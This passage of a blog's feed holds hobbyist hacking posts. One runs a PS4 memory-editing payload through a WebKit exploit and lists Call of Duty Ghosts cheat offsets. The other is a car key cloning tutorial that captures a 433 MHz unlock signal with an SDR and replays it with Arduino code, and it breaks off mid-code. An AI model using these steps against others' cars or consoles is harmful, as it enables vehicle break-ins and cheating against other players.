&lt;p&gt;PS4METool and PS4ME.dll with the payload are availables to download &lt;a href=&quot;https://www.mediafire.com/file/lk0crle06mismmn/PS4METool.rar/file&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><summary type="html">As I said on my last post, my main objective is to develop a software similar to PS3TMAPI/PS3CCAPI but for PS4.</summary></entry><entry><title type="html">Real Time Memory Editor (Retail PS4)</title><link href="http://localhost:4000/ps4-rte/" rel="alternate" type="text/html" title="Real Time Memory Editor (Retail PS4)" /><published>2017-03-13T00:00:00+01:00</published><updated>2017-03-13T00:00:00+01:00</updated><id>http://localhost:4000/ps4-rte</id><content type="html" xml:base="http://localhost:4000/ps4-rte/">&lt;p&gt;My main objective in PS4 was to develop a software that allows me to edit and modify the game meory to create game modifications and cheats.
This software is very similar to those used on PS3 (ps3tmapi for debug consoles and ccapi for retail consoles) and is based on the &lt;em&gt;ptrace&lt;/em&gt; syscall that in the PS4 corresponds with the syscall number 26.&lt;/p&gt;

&lt;p&gt;This software runs under the WebKit exploit released by cTurt and allow to execute unsigned code with privileges. This exploit also enables write protection and disable the ASLR (Address Space Layout Randomization) used to randomize the base address each time a process is created. With ASLR dissabled all games start at 0x400000 (Thansk to ZiL0G80).&lt;/p&gt;

&lt;p&gt;To avoid download game updates each time it is started, the exploit also spoofed the PS4 version (Thanks to zecoxao).&lt;/p&gt;

&lt;p&gt;The payload conects with the computer with IP 192.168.1.38 and port 4321 from where the read and write orders are sended.&lt;/p&gt;

&lt;h2 id=&quot;how-to-use-it&quot;&gt;How to use it&lt;/h2&gt;

&lt;p&gt;First of all, it’s necesary execute the server on the computer (if the server is the precompiled version you will have to change the computer IP to 192.168.1.38). When the server its running it will be waiting for the cPS4 conection.&lt;/p&gt;

&lt;p&gt;To send the payload to the PS4 run the following command:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; 3 PS4_IP 9023 &amp;lt; Debugger-Payload.bin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With the PS4 connected, it’s necessary the game process name to start the debugging porcess. Most process game names are &lt;em&gt;eboot.bin&lt;/em&gt; but there are other such as Call of Duty Ghost whose name is &lt;em&gt;default_mp.elf&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;If the game name has been correctly written will appeared the console indicator ‘&amp;gt;’ and to get the console commands just write &lt;em&gt;help&lt;/em&gt;.&lt;/p&gt;

&lt;h2 id=&quot;commands&quot;&gt;Commands&lt;/h2&gt;

&lt;p&gt;Here are the supported commands:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Reed memory: r 0x&lt;em&gt;Offset&lt;/em&gt;&lt;/li&gt;
  &lt;li&gt;Write memory: w 0x&lt;em&gt;Offset&lt;/em&gt; 0x&lt;em&gt;Value&lt;/em&gt;&lt;/li&gt;
  &lt;li&gt;Search forward: u 0x&lt;em&gt;Offset&lt;/em&gt; 0x&lt;em&gt;Value&lt;/em&gt; (Will search between Offset and Offset+0x1000)&lt;/li&gt;
  &lt;li&gt;Search backward: d  0x&lt;em&gt;Offset&lt;/em&gt; 0x&lt;em&gt;Value&lt;/em&gt; (Will search between Offset and Offset+0x1000)&lt;/li&gt;
  &lt;li&gt;New process: p process_name&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Here some Call of Duty Ghosts offsets (version 1.00):&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Name: 0x1F0F29C
Principal weapon: 0x1F0C26C
Secondary weapon: 0x1F0C270
Enable fps: 0x81B09A Enable: 80 78 10 01
Primary Ammo: 0x1f0c454
Primary FullAmmo: 0x1f0c3d4
Primary Cammo: 0x1F0C26D
Primary Accesory: 0x1F0C26E
Secondary Ammo: 0x1f0c460
Secondary FullAmmo: 0x1f0c3dc
Tactical Granade Ammo: 0x1f0c43c
Special Granade Ammo: 0x1f0c448
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Demo working on COD Ghosts 1.00:&lt;/p&gt;
&lt;center&gt;
	&lt;blockquote class=&quot;twitter-tweet&quot; data-lang=&quot;es&quot;&gt;&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;Mini Demo RTE/RTM Tool in PS4 (COD Ghosts) 😊 &lt;a href=&quot;https://t.co/D01gTlk6oM&quot;&gt;pic.twitter.com/D01gTlk6oM&lt;/a&gt;&lt;/p&gt;&amp;mdash; j0lama (@j0lama) &lt;a href=&quot;https://twitter.com/j0lama/status/841418515110350848?ref_src=twsrc%5Etfw&quot;&gt;13 de marzo de 2017&lt;/a&gt;&lt;/blockquote&gt;
&lt;script async=&quot;&quot; src=&quot;https://platform.twitter.com/widgets.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt;
&lt;/center&gt;

&lt;h2 id=&quot;important&quot;&gt;Important&lt;/h2&gt;
&lt;p&gt;Thanks to @TheoryWrong for answer all my noob questions.
This is only a little demo and probably it will have a lot of bugs.&lt;/p&gt;

&lt;h2 id=&quot;download&quot;&gt;Download&lt;/h2&gt;
&lt;p&gt;The source code has been released on my GitHUb account: &lt;a href=&quot;https://github.com/j0lama/PS4-Real-Time-Memory-Editor&quot;&gt;Download&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><summary type="html">My main objective in PS4 was to develop a software that allows me to edit and modify the game meory to create game modifications and cheats. This software is very similar to those used on PS3 (ps3tmapi for debug consoles and ccapi for retail consoles) and is based on the ptrace syscall that in the PS4 corresponds with the syscall number 26.</summary></entry><entry><title type="html">How to clone a car key</title><link href="http://localhost:4000/clone-carkey/" rel="alternate" type="text/html" title="How to clone a car key" /><published>2017-03-01T00:00:00+01:00</published><updated>2017-03-01T00:00:00+01:00</updated><id>http://localhost:4000/clone-carkey</id><content type="html" xml:base="http://localhost:4000/clone-carkey/">&lt;p&gt;Recently, a friend told me that he had bought a USB antenna to see the TV on the computer (R820T2) and that this antenna could capture traffic in a big frequency range, not only TV range. This antenna could capture frequencies of garage and car keys although it was designed to TV frequencies.&lt;/p&gt;

&lt;p&gt;With this info I decided to buy one of this TV antennas that are very cheap, only 10$ (&lt;a href=&quot;https://es.aliexpress.com/item/FW1S-New-USB-2-0-Digital-DVB-T-SDR-DAB-FM-HDTV-TV-Tuner-Receiver-Stick/32600825233.html?spm=a2g0s.11045068.rcmd404.2.266956a4uWrjNg&amp;amp;pvid=54eedbd9-24c7-42a3-9eed-ab60d3f9f07c&amp;amp;gps-id=detail404&amp;amp;scm=1007.16891.96945.0&amp;amp;scm-url=1007.16891.96945.0&amp;amp;scm_id=1007.16891.96945.0&quot;&gt;R820T2 TV antenna&lt;/a&gt;)&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
	  &lt;img src=&quot;/images/carkey/antenna.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;To send the signal captured from the car key with the antenna I used one &lt;a href=&quot;https://www.dx.com/p/uno-r3-development-board-microcontroller-mega328p-atmega16u2-compat-for-arduino-blue-black-2027231#.XAvpPnVKixu&quot;&gt;Arduino One R3&lt;/a&gt; and a &lt;a href=&quot;https://www.dx.com/p/rf-transmitter-receiver-module-433mhz-wireless-link-kit-w-spring-antennas-for-arduino-2057011#.XAvpVnVKixu&quot;&gt;433MHz Radio Frequency transmitter&lt;/a&gt;.&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;
	  &lt;img src=&quot;/images/carkey/arduino.jpg&quot; /&gt;
	  &lt;img src=&quot;/images/carkey/module.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;I decided to install GQRX that is an open source radio software that allows us see the frequencies spectre and detect our car key frequency using our antenna.
We can install GQRX easily with:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt-get &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;gqrx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p align=&quot;center&quot;&gt;
	  &lt;img src=&quot;/images/carkey/gqrx.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Now, with the antenna connected to the computer and GQRX running with the 433MHz frequency selected (common frequency for the car keys) and if we press any button of the car key, GQRX will capture it. In my case, the exact frecuency of my car key is 433.92MHz&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;
	  &lt;img src=&quot;/images/carkey/wave.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Once checked that the car key frequency is the correct one, we can capture the “open” and “close” message to reverse them and resend to the car with our Arduino.
I will do the process for the “open” message.
I use another open source software called rtl_433 to capture the message that can be downloaded from the official &lt;a href=&quot;https://github.com/merbanan/rtl_433&quot;&gt;GitHub repository&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;With rtl_433 installed we can follow the repository instructions to capture the signal with this command:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rtl_fm &lt;span class=&quot;nt&quot;&gt;-M&lt;/span&gt; am &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 433920000 &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 2000000 - | sox &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; raw &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; 2000000 &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; signed-integer &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; 16 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;-V1&lt;/span&gt; - sound.wav 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The -f parameter, that has the value 433920000, corresponds with the exact frequency of my car key and sound.wav is the name of the generated file with the signal captured.&lt;/p&gt;

&lt;p&gt;I executed the command for 10 seconds and I press the key button three times to have different captures of the “open” message.
To stop the capturing process press Ctrl + C.
With the .wav file in my desktop I opened it with Audacity, a sound editing software that will allows us reverse wave captures.
If we open the .wav file with Audacity we will see the next wave:&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;
	  &lt;img src=&quot;/images/carkey/auda1.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;In my case it was easy to appreciate that in the signal dump, there are three zones that corresponds with the periods that I have been with the key button pressed.
If we center our attention in one of these three zones we will see the signal like this:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
	  &lt;img src=&quot;/images/carkey/auda2.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;In the previous image we can see the same pattern repeated some times. Each of this repetitions correspond to the “open” message that are sended many times when we hold the key.
With this information we will clip one of this patterns to apply reverse engineering to it.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
	  &lt;img src=&quot;/images/carkey/auda3.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Now we have to apply reverse engineering to this signal fragment.
If we zoom in the signal, it can be appreciate that are some parts with a big amplitude and other with a smaller one. The big amplitude zones means 1 in binary and the small amplitude zones means 0 in binary.&lt;/p&gt;

&lt;p&gt;The last thing we have to calculate is the period of the binary simbols. This means that, if we want to send a digital 0 is translated to to an analogic 0 as a signal with small amplitude during a time T. T is what we have to calculate and we can do this easily with Audacity:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
	  &lt;img src=&quot;/images/carkey/auda4.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;In my case the period T is 0.4 ms as you can see in the previous image.&lt;/p&gt;

&lt;p&gt;With this information we can compile the code below replacing code array value with the 1/0 sequence that corresponds to our reversed signal.&lt;/p&gt;

&lt;p&gt;In the array, 1 means a period of big amplitudes of length T and 0 means a period of small amplitudes of, also, length T.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//Developed by j0lama&lt;/span&gt;
 
&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;SoftwareSerial.h&amp;gt;
&lt;/span&gt; 
&lt;span class=&quot;cp&quot;&gt;#define time 400
&lt;/span&gt; 
&lt;span class=&quot;cp&quot;&gt;#define pin 9
&lt;/span&gt; 
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;setup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;Serial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;begin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9600&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Serial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;pinMode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OUTPUT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;Serial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;The code will be sent in 2 seconds...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;loop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;170&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span 